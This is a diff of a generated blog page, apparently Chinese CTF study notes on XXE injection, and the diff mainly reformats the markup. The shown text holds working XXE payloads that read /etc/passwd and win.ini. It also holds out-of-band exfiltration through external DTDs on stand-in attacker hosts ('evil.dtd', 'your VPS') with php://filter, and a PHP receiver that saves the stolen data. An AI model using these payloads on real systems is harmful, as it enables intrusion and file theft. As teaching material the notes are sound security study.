@@ -100,7 +100,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2019-12-08</span>
-            <span class="time">10:20:57</span>
+            <span class="time">20:25:12</span>
           </span>
           
           <!--  Categories  -->
@@ -122,31 +122,25 @@
         
         <!-- Post Main Content -->
         <div class="post-content">
-          <ul>
-<li><p>最近有了一些时间，来整理一下遇到的一些琐碎的知识点</p>
+          <p>最近有了一些时间，来整理一下遇到的一些琐碎的知识点</p>
 <a id="more"></a>
-<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2></li>
-<li><p><em>简单的语法*</em></p>
-</li>
-<li><p>引用内部DTD</p>
-<pre><code class="hljs undefined"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
+<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p><strong>简单的语法</strong></p>
+<h2 id="引用内部DTD"><a href="#引用内部DTD" class="headerlink" title="引用内部DTD"></a>引用内部DTD</h2><pre><code class="hljs undefined"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
 <span class="hljs-meta">&lt;!DOCTYPE xdsec [
 &lt;!ELEMENT methodname ANY &gt;
 &lt;!ENTITY xxe(实体引用名) SYSTEM "file:///etc/passwd"(实体内容) &gt;]&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">methodcall</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">methodname</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">methodname</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">methodcall</span>&gt;</span></code></pre>
-</li>
-<li><p>引用外部DTD</p>
-<pre><code class="hljs undefined"><span class="hljs-meta">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;
+
+<h2 id="引用外部DTD"><a href="#引用外部DTD" class="headerlink" title="引用外部DTD"></a>引用外部DTD</h2><pre><code class="hljs undefined"><span class="hljs-meta">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;
 &lt;!ENTITY  % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" &gt;
 %xxe;]&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>&amp;evil;<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> <span class="hljs-attr">evil</span> <span class="hljs-attr">SYSTEM</span> “<span class="hljs-attr">file:</span>///<span class="hljs-attr">c:</span>/<span class="hljs-attr">windows</span>/<span class="hljs-attr">win.ini</span>” &gt;</span>//这个要写到http://xxx.xxx.xxx/才能被引用
 //所以在攻击的时候我们只需要把前四行代码写入到对面上传漏洞的界面，本地的vps上写evil.dtd就可以获得对方win.ini的信息啦！～</code></pre>
-</li>
-<li><p>在有回显的情况下,利用php中写入xml，读取任意etc/passwd</p>
-<pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>
+
+<h2 id="在有回显的情况下-利用php中写入xml，读取任意etc-passwd"><a href="#在有回显的情况下-利用php中写入xml，读取任意etc-passwd" class="headerlink" title="在有回显的情况下,利用php中写入xml，读取任意etc/passwd"></a>在有回显的情况下,利用php中写入xml，读取任意etc/passwd</h2><pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>
 $xml = <span class="hljs-string">&lt;&lt;&lt;EOF
 &lt;?xml version = "1.0"?&gt;</span></span>
 <span class="hljs-meta">&lt;!DOCTYPE ANY [
@@ -157,15 +151,13 @@ EOF;
 $data = simplexml_load_string($xml);
 print_r($data);
 ?&gt;//上传这个php就会出现对方主机的etc/passwd</code></pre>
-</li>
-<li><p>无回显条件，读取数据(具体的思想就是需要在主体php构造语句，来回调用其他文件中的恶意代码)</p>
-</li>
-<li><p><em>首先在本地创建一个媒介工具的test.php,这个是媒介,用于把独到的数据传到test.php*</em></p>
+
+<p>无回显条件，读取数据(具体的思想就是需要在主体php构造语句，来回调用其他文件中的恶意代码)<br><strong>首先在本地创建一个媒介工具的test.php,这个是媒介,用于把独到的数据传到test.php</strong></p>
 <pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span> 
 file_put_contents(<span class="hljs-string">"test.txt"</span>, $_GET[<span class="hljs-string">'file'</span>]) ; 
 <span class="hljs-meta">?&gt;</span></span></code></pre>
-</li>
-<li><p>写带有payload的php页面</p>
+
+<p>写带有payload的php页面</p>
 <pre><code class="hljs undefined"><span class="xml"><span class="php"><span class="hljs-meta">&lt;?php</span> 
 $xml=&lt;&lt;&lt;EOF 
 <span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span> 
@@ -181,17 +173,11 @@ $data = simplexml_load_string($xml) ;
 echo "<span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>" ; 
 print_r($data) ; 
 ?&gt;</span></code></pre>
-</li>
-<li><p>test.xml里的内容</p>
+
+<p>test.xml里的内容</p>
 <pre><code class="hljs undefined">&lt;!<span class="hljs-keyword">ENTITY</span> % <span class="hljs-keyword">all</span> <span class="hljs-string">"&lt;!ENTITY % send SYSTEM 'http://localhost/test.php?file=%file;'&gt;"</span>&gt;//这一步是会读出本地的<span class="hljs-literal">text</span>.txt内容并上传到攻击服务器上的test.php</code></pre>
 
-</li>
-</ul>
-<p><strong>当访问<a href="http://localhost/index.php" target="_blank" rel="noopener">http://localhost/index.php</a>, 存在漏洞的服务器会读出text.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。</strong></p>
-<ul>
-<li><p>上面这个方法有些麻烦，我们来一个简洁一点的</p>
-</li>
-<li><p><em>解决方案2*</em></p>
+<p><strong>当访问<a href="http://localhost/index.php" target="_blank" rel="noopener">http://localhost/index.php</a>, 存在漏洞的服务器会读出text.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。</strong><br>上面这个方法有些麻烦，我们来一个简洁一点的<br><strong>解决方案2</strong></p>
 <pre><code class="hljs undefined"><span class="xml"><span class="hljs-meta">&lt;?xml verstion="1.0" encoding="utf-8"?&gt;</span>
 <span class="hljs-meta">&lt;!DOCTYPE a[
         &lt;!ENTITY % f SYSTEM "http://yourhost/evil.dtd"&gt;
@@ -200,15 +186,11 @@ print_r($data) ;
 <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>&amp;b;<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>//这个标签看<span class="hljs-meta">&lt;!DOCTYPE 后面的 是什么 上面是a所以这是a标签
 $data = simplexml_load_string($xml);
 print_r($data);</span></span></code></pre>
-</li>
-<li><p>然后在你本地evil.dtd的写入你想知道的对方文件(一般构造用file协议和php:filter协议)</p>
+
+<p>然后在你本地evil.dtd的写入你想知道的对方文件(一般构造用file协议和php:filter协议)</p>
 <pre><code class="hljs undefined">&lt;!ENTITY b<span class="hljs-built_in"> SYSTEM </span><span class="hljs-string">"file:///etc/passwd"</span>&gt;</code></pre>
 
-</li>
-</ul>
-<p><strong>解决方案3</strong></p>
-<ul>
-<li><p>这个是采用php伪协议</p>
+<p><strong>解决方案3</strong><br>这个是采用php伪协议</p>
 <pre><code class="hljs undefined">&lt;?xml <span class="hljs-attribute">version</span>=”1.0”?&gt;
 &lt;!DOCTYPE ANY [
 &lt;!ENTITY % file<span class="hljs-built_in"> SYSTEM </span><span class="hljs-string">"php://filter/read=convert.base64-encode/resource=./target.php"</span>&gt; # /etc/issue
@@ -216,22 +198,17 @@ print_r($data);</span></span></code></pre>
 %dtd;
 %send;
 ]&gt;</code></pre>
-</li>
-<li><p>evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25。</p>
+
+<p>evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25。</p>
 <pre><code class="hljs undefined">&lt;!ENTITY <span class="hljs-comment">% all</span>
 “&lt;!ENTITY &amp;#x25; send SYSTEM ‘http://xxx.xxx.xxx/?<span class="hljs-comment">%file;’&gt;”</span>
 &gt;
 <span class="hljs-comment">%all;</span></code></pre>
 
-</li>
-</ul>
-<p><strong>但是说了一大堆，遇到这种题型我们该怎么解呢</strong></p>
-<ul>
-<li>下面我介绍一个最方便的方案<br>对于无回显的xml注入:<br>在你的vps上放1.xml文件，内容如下:<pre><code class="hljs undefined">&lt;!ENTITY % f <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">"php://filter/read=convert.base64-encode/resource=file:///flag"</span>&gt;<span class="hljs-comment">//用于找对方的flag</span>
+<p><strong>但是说了一大堆，遇到这种题型我们该怎么解呢</strong><br>下面我介绍一个最方便的方案<br>对于无回显的xml注入:<br>在你的vps上放1.xml文件，内容如下:</p>
+<pre><code class="hljs undefined">&lt;!ENTITY % f <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">"php://filter/read=convert.base64-encode/resource=file:///flag"</span>&gt;<span class="hljs-comment">//用于找对方的flag</span>
 &lt;!ENTITY % <span class="hljs-keyword">all</span> <span class="hljs-string">"&lt;!ENTITY % s SYSTEM 'http://你的vps/xxe.php?f=%f;'&gt;"</span>&gt;<span class="hljs-comment">//把找到的文件写到你的本地</span></code></pre>
 
-</li>
-</ul>
 <p>再在你的vps上放xxe.php，内容如下:</p>
 <pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>
     file_put_contents(<span class="hljs-string">"/tmp/1.txt"</span>, $_GET[<span class="hljs-string">'f'</span>]);<span class="hljs-comment">//用于把flag文件写到本地的1.txt</span>
@@ -246,7 +223,7 @@ print_r($data);</span></span></code></pre>
 ]&gt;</span></span></code></pre>
 
 <p><strong>访问本地的1.txt就能得到flag</strong></p>
-<p><strong>参考链接</strong><br>    * <a href="https://skysec.top/2017/08/18/xml注入攻击学习/" target="_blank" rel="noopener">https://skysec.top/2017/08/18/xml注入攻击学习/</a><br>    * <a href="https://www.cnblogs.com/zhaijiahui/p/9147595.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/9147595.html</a></p>
+<p><strong>参考链接</strong><br>    <a href="https://skysec.top/2017/08/18/xml注入攻击学习/" target="_blank" rel="noopener">https://skysec.top/2017/08/18/xml注入攻击学习/</a><br>    <a href="https://www.cnblogs.com/zhaijiahui/p/9147595.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/9147595.html</a></p>
 
         </div>
       </div>
